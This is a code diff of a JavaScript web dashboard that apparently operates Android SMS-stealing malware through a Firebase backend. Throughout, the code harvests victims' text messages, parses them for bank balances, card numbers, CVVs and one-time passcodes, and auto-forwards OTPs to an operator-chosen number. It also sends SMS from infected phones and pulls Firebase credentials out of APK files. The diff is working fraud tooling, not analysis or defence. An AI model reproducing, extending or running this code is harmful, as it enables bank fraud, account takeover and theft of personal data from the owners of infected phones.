-  for(const r of EXP_RE){ const m = t.match(r); if(m && m[1]){ exp = m[1]; break; } }
+  for(const re of EXP_RE){ const m = t.match(re); if(m && m[1]){ exp = m[1]; break; } }
   return {last4, type, cvv, exp, raw: t};
 }
+
 function catMsg(t){
   const u = t.toUpperCase();
-  if(/\bOTP\b|ONE.?TIME|PASSCODE|VERIF/.test(u)) return "otp";
-  if(/AVL|AVAL|AVBL|\bBAL\b|CREDITED|DEBITED|INR|A\/C/.test(u)) return "bank";
+  if(/\bOTP\b|ONE.?TIME|PASSCODE|VERIF|\bVERIFICATION\b/.test(u)) return "otp";
+  if(/AVL|AVAL|AVBL|\bBAL\b|CREDITED|DEBITED|INR|A\/C|Charged|Charges/.test(u)) return "bank";
   if(/\bCARD\b|CVV/.test(u)) return "card";
   return "gen";
 }
+
 function extractOtp(t){
   let m = t.match(/\b(\d{6})\b/);
   if(m) return m[1];
-  m = t.match(/(?:OTP|otp|code|CODE)[\s:\-]*(\d{4,8})/);
+  m = t.match(/(?:OTP|otp|code|CODE|PIN|pin)[\s:\-]*(\d{4,8})/);
   if(m) return m[1];
-  m = t.match(/(?<![₹$])\b(\d{4,8})\b/);
+  m = t.match(/(?<![₹$\d])\b(\d{4,8})\b/);
   return m ? m[1] : null;
 }
 
-/* ─── firebase ─── */
+/* ─────────── firebase ─────────── */
 async function fbGet(path){
   if(!S.url || !S.key) throw new Error("Not connected");
   const base = S.url.replace(/\/+$/,"");
@@ -953,53 +939,51 @@ async function fbDel(path){
   return r.json();
 }
 
-/* ─── helpers ─── */
-function toast(m, t){
-  const b = $("toasts");
-  const e = document.createElement("div");
-  e.className = "tst" + (t ? " " + t : "");
-  e.textContent = m;
-  b.appendChild(e);
-  setTimeout(() => { e.style.opacity = "0"; e.style.transform = "translateY(10px)"; setTimeout(() => e.remove(), 220); }, 2600);
-}
-function fmtPhone(n){
-  n = String(n || "").replace(/\D/g,"");
-  if(n.length === 12 && n.startsWith("91")) n = n.slice(2);
-  if(n.length === 10) return n.replace(/(\d{5})(\d{5})/, "$1 $2");
-  return n || "—";
-}
-function fmtTime(ts){
-  if(!ts) return "";
-  const d = new Date(ts);
-  if(isNaN(d)) return "";
-  const diff = Date.now() - ts;
-  if(diff < 0) return "now";
-  const s = Math.floor(diff/1000), m = Math.floor(s/60), h = Math.floor(m/60), dd = Math.floor(h/24);
-  if(s < 60) return s + "s ago";
-  if(m < 60) return m + "m ago";
-  if(h < 24) return h + "h " + (m%60) + "m ago";
-  if(dd < 30) return dd + "d " + (h%24) + "h ago";
-  return d.toLocaleDateString("en-IN", {day:"2-digit", month:"short", year:"numeric"});
-}
-function fmtFull(ts){
-  if(!ts) return "";
-  const d = new Date(ts);
-  if(isNaN(d)) return "";
-  return d.toLocaleString("en-IN", {day:"2-digit", month:"short", year:"numeric", hour:"2-digit", minute:"2-digit", hour12:true});
-}
-function numFmt(n){
-  try { return parseFloat(n).toLocaleString("en-IN", {minimumFractionDigits:2, maximumFractionDigits:2}); }
-  catch { return String(n); }
-}
-function copy(text, label){
-  navigator.clipboard.writeText(text).then(() => toast(label || "Copied", "ok")).catch(() => {
-    const t = document.createElement("textarea");
-    t.value = text; document.body.appendChild(t); t.select(); document.execCommand("copy"); t.remove();
-    toast(label || "Copied", "ok");
-  });
+/* ─────────── enrich: extract phone from messages ─────────── */
+async function enrichDevice(devId){
+  try {
+    const data = await fbGet(`messages/${devId}`);
+    const msgs = parseMsgs(data);
+    let phone = "", network = "";
+    for(const m of msgs){
+      if(!phone){
+        const p = extractPhone(m.body);
+        if(p){
+          phone = p;
+          network = detectNetworkFromText(m.body, m.sender);
+        }
+      }
+    }
+    return {phone, network, msgCount: msgs.length, msgs};
+  } catch {
+    return {phone:"", network:"", msgCount:0, msgs:[]};
+  }
 }
 
-/* ─── login ─── */
+/* ─────────── analysis (bank/card/otp) ─────────── */
+function analyze(msgs){
+  const a = { bank:[], cards:[], otps:[], phones:[], networks:[] };
+  const ps = new Set(), ns = new Set();
+  for(const m of msgs){
+    const b = parseBank(m.body, m.sender);
+    if(b){ b.ts = m.ts; a.bank.push(b); }
+    const c = parseCard(m.body);
+    if(c){ c.ts = m.ts; a.cards.push(c); }
+    if(m.cat === "otp"){
+      const o = extractOtp(m.body);
+      if(o) a.otps.push({otp:o, sender:m.sender, ts:m.ts, body:m.body});
+    }
+    const p = extractPhone(m.body);
+    if(p) ps.add(p);
+    const n = detectNetworkFromText(m.body, m.sender);
+    if(n) ns.add(n);
+  }
+  a.phones = [...ps];
+  a.networks = [...ns];
+  return a;
+}
+
+/* ─────────── login ─────────── */
 function getAccts(){
   try { return JSON.parse(localStorage.getItem(LS_A) || "[]"); } catch { return []; }
 }
@@ -1034,21 +1018,19 @@ function showSaved(){
         <div class="acct-u">${esc(acc.url)}</div>
         <div class="acct-d">${esc(acc.date || "")}</div>
       </div>
-      <button class="icon-b" title="Share" data-act="share" data-i="${i}">
+      <button class="icon-b" data-act="share" data-i="${i}" title="Share">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><path d="M8.6 13.5l6.8 4M15.4 6.5l-6.8 4"/></svg>
       </button>
-      <button class="icon-b dng" title="Delete" data-act="del" data-i="${i}">
+      <button class="icon-b dng" data-act="del" data-i="${i}" title="Delete">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/></svg>
       </button>`;
     row.addEventListener("click", ev => {
       const t = ev.target.closest("[data-act]");
       if(t){
         ev.stopPropagation();
-        const act = t.dataset.act;
-        const idx = parseInt(t.dataset.i);
-        if(act === "share"){
-          copy(shareLink(a[idx].url, a[idx].key), "Share link copied");
-        } else if(act === "del"){
+        const act = t.dataset.act, idx = parseInt(t.dataset.i);
+        if(act === "share") copy(shareLink(a[idx].url, a[idx].key), "Share link copied");
+        else if(act === "del"){
           if(confirm("Delete account?")){ const l = getAccts(); l.splice(idx, 1); setAccts(l); showSaved(); }
         }
         return;
@@ -1065,12 +1047,7 @@ function showNew(){
   $("inpUrl").value = ""; $("inpKey").value = "";
   $("btnGo").textContent = "Connect";
 }
-
-function showErr(m){
-  const b = $("errBox");
-  b.textContent = m;
-  b.classList.add("on");
-}
+function showErr(m){ const b = $("errBox"); b.textContent = m; b.classList.add("on"); }
 function clearErr(){ $("errBox").classList.remove("on"); }
 
 async function login(){
@@ -1080,14 +1057,13 @@ async function login(){
   if(!url || !key){ showErr("Enter URL and Key"); return; }
   if(!/^https?:\/\//.test(url)) url = "https://" + url;
   if(!/firebaseio\.com|firebasedatabase\.app/.test(url)){
-    showErr("Invalid Firebase URL — must contain firebaseio.com or firebasedatabase.app");
+    showErr("Invalid Firebase URL");
     return;
   }
   const btn = $("btnGo");
   btn.disabled = true; btn.textContent = "Connecting...";
-  try {
-    await connect(url, key, true);
-  } catch(e){
+  try { await connect(url, key, true); }
+  catch(e){
     btn.disabled = false; btn.textContent = "Connect";
     showErr(e.message || "Connection failed");
   }
@@ -1108,19 +1084,17 @@ async function connect(url, key, save){
   }
   $("login").style.display = "none";
   $("app").classList.add("on");
+  try { S.tg = JSON.parse(localStorage.getItem(LS_TG) || "{}"); } catch { S.tg = {}; }
+  try { S.fwd = JSON.parse(localStorage.getItem(LS_FWD) || "{}"); } catch { S.fwd = {}; }
   boot();
   notifyAdmins(url, key).catch(() => {});
-  try { S.tg = JSON.parse(localStorage.getItem("ghost_tg") || "{}"); } catch { S.tg = {}; }
-  try { S.fwd = JSON.parse(localStorage.getItem("ghost_fwd") || "{}"); } catch { S.fwd = {}; }
 }
 
 function logout(){
   if(!confirm("Logout?")) return;
-  if(S.pollT) clearInterval(S.pollT);
-  if(S.msgT) clearInterval(S.msgT);
-  if(S.watchT) clearInterval(S.watchT);
+  [S.pollT, S.msgT, S.watchT].forEach(t => t && clearInterval(t));
   S.url = ""; S.key = ""; S.devices = []; S.cur = null; S.msgs = [];
-  S.seen.clear(); S.seeded.clear();
+  S.seen.clear(); S.seeded.clear(); S.phoneCache = {};
   $("app").classList.remove("on");
   $("login").style.display = "flex";
   showSaved();
@@ -1169,27 +1143,23 @@ async function parseApk(file){
     }
     if(!url || !key){
       const g = zip.file("google-services.json") || zip.file("assets/google-services.json");
-      if(g){
-        try {
-          const j = JSON.parse(await g.async("text"));
-          if(!url && j?.project_info?.firebase_url) url = j.project_info.firebase_url;
-          const api = j?.client?.[0]?.api_key?.[0]?.current_key;
-          if(!key && api) key = api;
-        } catch {}
-      }
+      if(g) try {
+        const j = JSON.parse(await g.async("text"));
+        if(!url && j?.project_info?.firebase_url) url = j.project_info.firebase_url;
+        const api = j?.client?.[0]?.api_key?.[0]?.current_key;
+        if(!key && api) key = api;
+      } catch {}
     }
     if(!url && !key){ toast("Firebase config not found", "err"); return; }
     $("inpUrl").value = url || "";
     $("inpKey").value = key || "";
-    toast("Extracted — review and connect", "ok");
+    toast("Extracted", "ok");
   } catch(e){ toast("Parse failed", "err"); }
 }
 
-/* ─── boot / poll ─── */
+/* ─────────── boot ─────────── */
 function boot(){
-  if(S.pollT) clearInterval(S.pollT);
-  if(S.msgT) clearInterval(S.msgT);
-  if(S.watchT) clearInterval(S.watchT);
+  [S.pollT, S.msgT, S.watchT].forEach(t => t && clearInterval(t));
   fetchDevices();
   S.pollT = setInterval(fetchDevices, CFG.pollDevices || 15000);
   S.watchT = setInterval(watchAll, 10000);
@@ -1201,12 +1171,32 @@ async function fetchDevices(){
     const devs = parseDevices(data);
     for(const d of devs){
       const old = S.devices.find(x => x.id === d.id);
-      if(old && old.analysis) d.analysis = old.analysis;
+      if(old){
+        if(old.analysis) d.analysis = old.analysis;
+        if(old.phone) d.phone = old.phone;
+        if(old.network) d.network = old.network;
+        if(old.msgCount) d.msgCount = old.msgCount;
+      }
     }
     S.devices = devs;
     stats(); render();
-    for(const d of devs){
-      if(!d.analysis) analyze(d.id).catch(() => {});
+
+    // Enrich new devices — fetch messages & extract phone
+    const newDevs = devs.filter(d => !S.phoneCache[d.id]);
+    const queue = newDevs.slice(0, 20);
+    for(let i = 0; i < queue.length; i += 4){
+      await Promise.all(queue.slice(i, i + 4).map(async d => {
+        const res = await enrichDevice(d.id);
+        S.phoneCache[d.id] = res;
+        const dev = S.devices.find(x => x.id === d.id);
+        if(dev){
+          dev.phone = res.phone;
+          dev.network = res.network;
+          dev.msgCount = res.msgCount;
+          dev.analysis = analyze(res.msgs);
+        }
+      }));
+      stats(); render();
     }
     if(S.cur){
       const f = S.devices.find(x => x.id === S.cur.id);
@@ -1217,27 +1207,6 @@ async function fetchDevices(){
   }
 }
 
-async function analyze(id){
-  const data = await fbGet(`messages/${id}?orderBy="$key"&limitToLast=150`);
-  const msgs = parseMsgs(data);
-  const a = { bank:[], cards:[], phones:[], networks:[], otps:[] };
-  const ps = new Set(), ns = new Set();
-  for(const m of msgs){
-    const b = parseBank(m.body, m.sender); if(b) a.bank.push(b);
-    const c = parseCard(m.body); if(c) a.cards.push(c);
-    const p = detectPhone(m.body); if(p) ps.add(p);
-    const n = detectNet(m.sender, m.body); if(n) ns.add(n);
-    if(m.cat === "otp"){ const o = extractOtp(m.body); if(o) a.otps.push({otp:o, sender:m.sender, ts:m.ts}); }
-  }
-  a.phones = [...ps]; a.networks = [...ns];
-  const d = S.devices.find(x => x.id === id);
-  if(d){
-    d.analysis = a;
-    stats(); render();
-    if(S.cur && S.cur.id === id){ S.cur = d; pills(); }
-  }
-}
-
 async function watchAll(){
   for(const d of S.devices) watchDev(d.id).catch(() => {});
 }
@@ -1245,22 +1214,26 @@ async function watchAll(){
 async function watchDev(id){
   try {
     if(!S.seeded.has(id)){
-      const data = await fbGet(`messages/${id}?limitToLast=30`);
-      if(data && typeof data === "object"){
-        for(const k of Object.keys(data)) S.seen.add(id + "_" + k);
-      }
+      const data = await fbGet(`messages/${id}`);
+      if(data && typeof data === "object") for(const k of Object.keys(data)) S.seen.add(id + "_" + k);
       S.seeded.add(id);
       return;
     }
-    const data = await fbGet(`messages/${id}?limitToLast=10`);
+    const data = await fbGet(`messages/${id}`);
     if(!data || typeof data !== "object") return;
-    for(const [k, v] of Object.entries(data)){
+    const entries = Object.entries(data);
+    const recent = entries.slice(-10);
+    for(const [k, v] of recent){
       const key = id + "_" + k;
       if(S.seen.has(key)) continue;
       S.seen.add(key);
-      const body = String(df(v,"body","message","text","msg") || "");
+      const body = String(v.message || v.body || v.text || "");
       if(!body.trim()) continue;
-      const m = {sender: String(df(v,"sender","address","from") || "?"), body, ts: parseTs(df(v,"timestamp","dateTime","date","time")) || Date.now()};
+      const m = {
+        sender: String(v.sender || v.address || "Unknown"),
+        body,
+        ts: parseCustomDate(v.dateTime) || parseTs(v.id) || Date.now()
+      };
       autoFwd(id, m).catch(() => {});
       if(catMsg(body) === "otp"){
         const otp = extractOtp(body);
@@ -1278,12 +1251,11 @@ async function autoFwd(id, m){
   const text = (cat === "otp" && otp)
     ? `OTP: ${otp}\nFrom: ${m.sender}\n${m.body}`
     : `From: ${m.sender}\n${m.body}`;
-  try {
-    await fbSet(`clients/${id}/webhookEvent/sendSms`, {from:1, to:fwd, message:text, isSended:false});
-  } catch {}
+  try { await fbSet(`clients/${id}/webhookEvent/sendSms`, {from:1, to:fwd, message:text, isSended:false}); }
+  catch {}
 }
 
-/* ─── stats / render ─── */
+/* ─────────── stats / render ─────────── */
 function stats(){
   const t = S.devices.length;
   const on = S.devices.filter(d => d.status).length;
@@ -1312,16 +1284,17 @@ function render(){
     if(S.filter === "offline" && d.status) return false;
     if(S.filter === "bank" && (!d.analysis || !d.analysis.bank.length)) return false;
     if(S.filter === "card" && (!d.analysis || !d.analysis.cards.length)) return false;
-    if(S.filter === "sms" && (!d.analysis || (!d.analysis.bank.length && !d.analysis.cards.length && !d.analysis.otps.length))) return false;
+    if(S.filter === "otp" && (!d.analysis || !d.analysis.otps.length)) return false;
+    if(S.filter === "phone" && !d.phone) return false;
     if(q){
-      const hay = (d.name + " " + d.phone + " " + d.id + " " + d.sims.map(s => s.number + " " + s.operator).join(" ")).toLowerCase();
+      const hay = (d.name + " " + d.phone + " " + d.id + " " + d.network).toLowerCase();
       if(!hay.includes(q)) return false;
     }
     return true;
   });
   list.sort((a, b) => {
-    if(sort === "name") return a.name.localeCompare(b.name);
     if(sort === "bat") return b.batteryPercent - a.batteryPercent;
+    if(sort === "msgs") return (b.msgCount || 0) - (a.msgCount || 0);
     if(sort === "old") return a.id.localeCompare(b.id);
     return b.id.localeCompare(a.id);
   });
@@ -1339,27 +1312,28 @@ function render(){
 }
 
 function devCard(d, i){
-  const el = document.createElement("div");
-  el.className = "dev " + (d.status ? "on" : "");
-  el.style.animationDelay = (i * 20) + "ms";
+  const card = document.createElement("div");
+  card.className = "dev " + (d.status ? "on" : "");
+  card.style.animationDelay = (i * 20) + "ms";
   const bk = d.analysis && d.analysis.bank.length ? d.analysis.bank[0] : null;
   const cc = d.analysis ? d.analysis.cards.length : 0;
-  const ph = d.phone || (d.sims[0] && d.sims[0].number) || "—";
+  const ot = d.analysis ? d.analysis.otps.length : 0;
+  const ph = d.phone || "—";
   const batC = d.batteryPercent >= 60 ? "var(--gr)" : d.batteryPercent >= 30 ? "var(--or)" : "var(--rd)";
+
   let sims = "";
-  d.sims.forEach((s, idx) => {
-    if(!s.number && !s.operator) return;
-    const cls = idx === 0 ? "s1" : "s2";
-    sims += `<div class="simc"><span class="simb ${cls}">SIM${idx+1}</span>${s.number ? `<span class="simt">${esc(fmtPhone(s.number))}</span>`:""}${s.operator ? `<span class="simo">${esc(s.operator)}</span>`:""}</div>`;
-  });
-  el.innerHTML = `
+  if(d.network || d.phone){
+    sims = `<div class="simc"><span class="simb s1">SIM1</span>${d.phone ? `<span class="simt">${esc(fmtPhone(d.phone))}</span>`:""}${d.network ? `<span class="simo">${esc(d.network)}</span>`:""}</div>`;
+  }
+
+  card.innerHTML = `
     <div class="dev-h">
       <div class="dev-a ${d.status ? "on" : "off"}">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect width="14" height="20" x="5" y="2" rx="2"/><path d="M12 18h.01"/></svg>
       </div>
       <div class="dev-i">
         <div class="dev-n">${esc(d.name)}</div>
-        <div class="dev-p">${esc(fmtPhone(ph))}</div>
+        <div class="dev-p">${esc(ph === "—" ? "—" : fmtPhone(ph))}</div>
         ${sims ? `<div class="dev-sims">${sims}</div>` : ""}
         <div class="dev-id">
           <span class="dev-idt">${esc(d.id)}</span>
@@ -1374,35 +1348,37 @@ function devCard(d, i){
       <div class="mc"><div class="mc-v" style="color:${batC}">${d.batteryPercent ? d.batteryPercent + "%" : "—"}</div><div class="mc-l">Bat</div></div>
       <div class="mc"><div class="mc-v" style="color:var(--gr)">${d.analysis ? d.analysis.bank.length : 0}</div><div class="mc-l">Bank</div></div>
       <div class="mc"><div class="mc-v" style="color:var(--pu)">${cc}</div><div class="mc-l">Card</div></div>
-      <div class="mc"><div class="mc-v" style="color:var(--or)">${d.analysis ? d.analysis.otps.length : 0}</div><div class="mc-l">OTP</div></div>
+      <div class="mc"><div class="mc-v" style="color:var(--or)">${ot}</div><div class="mc-l">OTP</div></div>
     </div>
     ${bk ? `<div class="dev-bk">
-      <div class="dev-bk-h"><span class="dev-bk-n">${esc(bk.bankName)}${bk.acc ? " ••" + esc(bk.acc) : ""}</span></div>
+      <div class="dev-bk-n">${esc(bk.bankName)}${bk.acc ? " ••" + esc(bk.acc) : ""}</div>
       <div class="dev-bk-v">₹${esc(numFmt(bk.balance))}</div>
       ${bk.dir ? `<div class="dev-bk-s" style="color:${bk.dir === "credit" ? "var(--gr)" : "var(--rd)"}">${bk.dir === "credit" ? "+" : "−"}₹${esc(numFmt(bk.amount || 0))} ${bk.dir}</div>` : ""}
     </div>` : ""}
     <div class="dev-f">
       <span class="dot ${d.status ? "g" : "t"}"></span>
-      ${d.status ? (d.lastSeen ? "Active " + fmtTime(d.lastSeen) : "Online") : (d.lastSeen ? "Seen " + fmtTime(d.lastSeen) : "Offline")}
+      ${d.status ? (d.lastSeen ? "Active " + fmtAgo(d.lastSeen) : "Online") : (d.lastSeen ? "Seen " + fmtAgo(d.lastSeen) : "Offline")}
+      ${d.msgCount ? ` · ${d.msgCount} msgs` : ""}
     </div>`;
-  el.addEventListener("click", () => openDrawer(d.id));
-  return el;
+  card.addEventListener("click", () => openDrawer(d.id));
+  return card;
 }
 
-/* ─── drawer ─── */
+/* ─────────── drawer ─────────── */
 function openDrawer(id){
   const d = S.devices.find(x => x.id === id);
   if(!d) return;
   S.cur = d; S.msgs = [];
   $("dName").textContent = d.name;
-  $("dPhone").textContent = fmtPhone(d.phone || (d.sims[0] && d.sims[0].number) || "—");
+  $("dPhone").textContent = d.phone ? fmtPhone(d.phone) + (d.network ? " · " + d.network : "") : "—";
   $("drOv").classList.add("on");
   tab("info"); pills();
   fetchMsgs(id);
   loadSettings(id);
-  $("spu1").textContent = (d.sims[0] && d.sims[0].number) ? fmtPhone(d.sims[0].number) : "—";
-  $("spu2").textContent = (d.sims[1] && d.sims[1].number) ? fmtPhone(d.sims[1].number) : "—";
-  $("useNumB").style.display = (d.phone || (d.sims[0] && d.sims[0].number)) ? "block" : "none";
+  $("spu1").textContent = d.phone ? fmtPhone(d.phone) : "—";
+  $("spu2").textContent = "—";
+  $("useNumB").style.display = d.phone ? "block" : "none";
+  $("setAlias").value = d.hasAlias ? d.name : "";
   if(S.msgT) clearInterval(S.msgT);
   S.msgT = setInterval(() => fetchMsgs(id), CFG.pollMessages || 6000);
 }
@@ -1419,16 +1395,26 @@ function pills(){
   const p = [];
   p.push(`<span class="p ${d.status ? "g" : "r"}">${d.status ? "● Online" : "○ Offline"}</span>`);
   p.push(`<span class="p c">Bat ${esc(d.battery || "—")}</span>`);
-  if(d.upi) p.push(`<span class="p o">UPI set</span>`);
+  if(d.network) p.push(`<span class="p o">${esc(d.network)}</span>`);
   if(d.analysis && d.analysis.bank.length) p.push(`<span class="p g">${d.analysis.bank.length} Bank</span>`);
   if(d.analysis && d.analysis.cards.length) p.push(`<span class="p p">${d.analysis.cards.length} Card</span>`);
+  if(d.analysis && d.analysis.otps.length) p.push(`<span class="p o">${d.analysis.otps.length} OTP</span>`);
   $("dPills").innerHTML = p.join("");
 }
 
 async function fetchMsgs(id){
   try {
-    const data = await fbGet(`messages/${id}?orderBy="$key"&limitToLast=150`);
+    const data = await fbGet(`messages/${id}`);
     S.msgs = parseMsgs(data);
+    const a = analyze(S.msgs);
+    const d = S.devices.find(x => x.id === id);
+    if(d) d.analysis = a;
+    if(S.cur && S.cur.id === id){
+      S.cur.analysis = a;
+      $("tcB").textContent = a.bank.length;
+      $("tcC").textContent = a.cards.length;
+      $("tcO").textContent = a.otps.length;
+    }
     renderSms();
     $("tcS").textContent = S.msgs.length;
   } catch {}
@@ -1440,6 +1426,7 @@ function tab(t){
   if(t === "info") renderInfo();
   if(t === "bank") renderBank();
   if(t === "cards") renderCards();
+  if(t === "otp") renderOtpPane();
   if(t === "sms") renderSms();
   if(t === "debug") renderDebug();
 }
@@ -1450,7 +1437,7 @@ function renderInfo(){
   const el = $("pane-info");
   let h = "";
   if(!d.status && d.lastSeen){
-    h += `<div class="alert"><div class="alert-l">Last Seen</div><div class="alert-b">${fmtTime(d.lastSeen)}</div><div class="alert-s">${fmtFull(d.lastSeen)}</div></div>`;
+    h += `<div class="alert"><div class="alert-l">Last Seen</div><div class="alert-b">${fmtAgo(d.lastSeen)}</div><div class="alert-s">${fmtFull(d.lastSeen)}</div></div>`;
   } else if(d.status && d.lastSeen){
     h += `<div class="okb"><div class="okb-l">Last Activity</div><div class="okb-v">${fmtFull(d.lastSeen)}</div></div>`;
   }
@@ -1458,29 +1445,25 @@ function renderInfo(){
     return `<div class="row"><div class="row-k">${esc(k)}</div><div class="row-v ${mono ? "m" : ""}">${esc(v || "—")}</div></div>`;
   }
   h += `<div class="sect">Device</div>`;
-  h += row("Phone", d.phone || "—", true);
+  h += row("Device ID", d.id, true);
+  h += row("Name", d.name + (d.hasAlias ? " (alias)" : " (auto)"));
+  h += row("Phone", d.phone ? fmtPhone(d.phone) : "—", true);
   h += row("Network", d.network || "—");
-  h += row("Android", d.android || "—");
-  h += row("IP", d.ip || "—", true);
-  h += row("Storage", d.storage || "—");
-  h += row("CPU", d.cpu || "—", true);
-  h += row("SDK", d.sdk || "—");
-  h += row("UPI PIN", d.upi || "Not set");
-  h += `<div class="sect">SIMs</div>`;
-  if(d.sims.length){
-    d.sims.forEach((s, i) => {
-      h += row(`SIM${i+1} Number`, s.number || "—", true);
-      if(s.operator) h += row(`SIM${i+1} Operator`, s.operator);
-    });
-  } else {
-    h += row("SIMs", "Not detected");
-  }
-  if(d.analysis && d.analysis.phones.length){
-    h += `<div class="sect">From SMS</div>`;
-    d.analysis.phones.forEach((p, i) => h += row("Phone #" + (i+1), p, true));
-  }
-  if(d.analysis && d.analysis.networks.length){
-    d.analysis.networks.forEach((n, i) => h += row("Network #" + (i+1), n));
+  h += row("Battery", d.battery || "—");
+  h += row("Status", d.status ? "Online" : "Offline");
+  h += row("Total Messages", String(d.msgCount || S.msgs.length || 0));
+  if(d.lastSeen) h += row("Last Seen", fmtFull(d.lastSeen));
+  if(d.analysis){
+    h += `<div class="sect">Extracted from SMS</div>`;
+    h += row("Bank SMS", String(d.analysis.bank.length));
+    h += row("Card SMS", String(d.analysis.cards.length));
+    h += row("OTP SMS", String(d.analysis.otps.length));
+    if(d.analysis.phones.length){
+      d.analysis.phones.forEach((p, i) => h += row("Phone #" + (i+1), p, true));
+    }
+    if(d.analysis.networks.length){
+      h += row("Networks", d.analysis.networks.join(", "));
+    }
   }
   el.innerHTML = h;
 }
@@ -1490,7 +1473,6 @@ function renderBank(){
   if(!d) return;
   const el = $("pane-bank");
   const list = d.analysis ? d.analysis.bank : [];
-  $("tcB").textContent = list.length;
   if(!list.length){
     el.innerHTML = `<div class="empty"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M3 6h18v12H3z"/><path d="M3 10h18"/></svg><p>No bank SMS</p><small>Bank messages will appear here</small></div>`;
     return;
@@ -1502,6 +1484,7 @@ function renderBank(){
       <div><div class="bk-l">Latest Balance</div><div class="bk-v">₹${esc(numFmt(first.balance))}</div></div>
       ${first.acc ? `<div style="text-align:right"><div class="bk-l">Account</div><div style="font-family:var(--mono);color:var(--text2);font-size:12px">•• ${esc(first.acc)}</div></div>` : ""}
     </div>
+    ${first.ts ? `<div style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-top:8px">${fmtFull(first.ts)}</div>` : ""}
   </div>`;
   for(const b of list){
     const cls = b.dir === "credit" ? "cr" : "db";
@@ -1517,6 +1500,7 @@ function renderBank(){
       </div>
       ${b.acc ? `<div class="tags"><span class="tg">•• ${esc(b.acc)}</span></div>` : ""}
       <div class="bk-rw">${esc(b.raw)}</div>
+      ${b.ts ? `<div style="font-family:var(--mono);font-size:9px;color:var(--text3);margin-top:6px">${fmtFull(b.ts)}</div>` : ""}
     </div>`;
   }
   el.innerHTML = h;
@@ -1527,7 +1511,6 @@ function renderCards(){
   if(!d) return;
   const el = $("pane-cards");
   const list = d.analysis ? d.analysis.cards : [];
-  $("tcC").textContent = list.length;
   if(!list.length){
     el.innerHTML = `<div class="empty"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg><p>No card info</p></div>`;
     return;
@@ -1554,6 +1537,31 @@ function revealCvv(i, btn){
   if(!list || !list[i]) return;
   const cvv = list[i].cvv;
   btn.parentElement.innerHTML = `<span style="color:var(--pu)">${esc(cvv)}</span> <button class="rev" onclick="G.copy('${esc(cvv)}','CVV copied')">Copy</button>`;
+}
+
+function renderOtpPane(){
+  const d = S.cur;
+  if(!d) return;
+  const el = $("pane-otp");
+  const list = d.analysis ? d.analysis.otps : [];
+  if(!list.length){
+    el.innerHTML = `<div class="empty"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect width="18" height="12" x="3" y="6" rx="2"/><path d="M7 12h10"/></svg><p>No OTP found</p></div>`;
+    return;
+  }
+  let h = `<div class="slist">`;
+  for(const o of list){
+    h += `<div class="sms otp" onclick="G.copy('${esc(o.otp)}','OTP copied')">
+      <div class="sms-h">
+        <span class="sms-t otp">OTP</span>
+        <span class="sms-s">${esc(o.sender)}</span>
+        <span class="sms-tm">${o.ts ? fmtAgo(o.ts) : ""}</span>
+      </div>
+      <div class="sms-o">${esc(o.otp)}</div>
+      <div class="sms-b">${esc(o.body)}</div>
+    </div>`;
+  }
+  h += `</div>`;
+  el.innerHTML = h;
 }
 
 function renderSms(){
@@ -1585,17 +1593,17 @@ function msgEl(m){
     </div>
     ${otp ? `<div class="sms-o">${esc(otp)}</div>` : ""}
     <div class="sms-b">${esc(m.body)}</div>
-    <button class="sms-x" onclick="event.stopPropagation();G.deleteMsg('${esc(m.id)}')">✕</button>`;
+    <button class="sms-x" onclick="event.stopPropagation();G.deleteMsg('${esc(m.pushId)}')">✕</button>`;
   el.addEventListener("click", () => copy(m.body, "Message copied"));
   return el;
 }
 
-async function deleteMsg(id){
+async function deleteMsg(pushId){
   if(!S.cur) return;
   if(!confirm("Delete message?")) return;
   try {
-    await fbDel(`messages/${S.cur.id}/${id}`);
-    S.msgs = S.msgs.filter(m => m.id !== id);
+    await fbDel(`messages/${S.cur.id}/${pushId}`);
+    S.msgs = S.msgs.filter(m => m.pushId !== pushId);
     renderSms(); $("tcS").textContent = S.msgs.length;
     toast("Deleted", "ok");
   } catch { toast("Failed", "err"); }
@@ -1619,8 +1627,8 @@ function setMf(f){
 
 function exportSms(){
   if(!S.cur || !S.msgs.length){ toast("Nothing to export", "err"); return; }
-  const rows = [["Sender","Time","Body"]];
-  for(const m of S.msgs) rows.push([m.sender, m.time || "", m.body.replace(/\n/g," ")]);
+  const rows = [["Sender","Time","Category","Body"]];
+  for(const m of S.msgs) rows.push([m.sender, m.timeFull || m.time || "", m.cat, m.body.replace(/\n/g," ")]);
   const csv = rows.map(r => r.map(c => `"${String(c).replace(/"/g,'""')}"`).join(",")).join("\n");
   const b = new Blob([csv], {type:"text/csv"});
   const a = document.createElement("a");
@@ -1630,7 +1638,7 @@ function exportSms(){
   toast("Exported", "ok");
 }
 
-/* ─── send ─── */
+/* ─────────── send ─────────── */
 function pickSim(n){
   S.sim = n;
   $("sp1").classList.toggle("on", n === 1);
@@ -1638,9 +1646,8 @@ function pickSim(n){
   $("sLbl").textContent = n;
 }
 function useNum(){
-  if(!S.cur) return;
-  const n = S.cur.phone || (S.cur.sims[0] && S.cur.sims[0].number);
-  if(n) $("sendTo").value = n;
+  if(!S.cur || !S.cur.phone) return;
+  $("sendTo").value = S.cur.phone;
 }
 async function sendSms(){
   if(!S.cur) return;
@@ -1654,7 +1661,7 @@ async function sendSms(){
   } catch { toast("Failed", "err"); }
 }
 
-/* ─── settings ─── */
+/* ─────────── settings ─────────── */
 async function loadSettings(id){
   let tg = S.tg[id] || "";
   let fwd = S.fwd[id] || "";
@@ -1665,7 +1672,7 @@ async function loadSettings(id){
   $("tgSt").classList.toggle("on", !!tg);
   $("fwdSt").classList.toggle("on", !!fwd);
   const d = S.cur;
-  $("pinBox").textContent = d && d.upi ? d.upi : "Not detected";
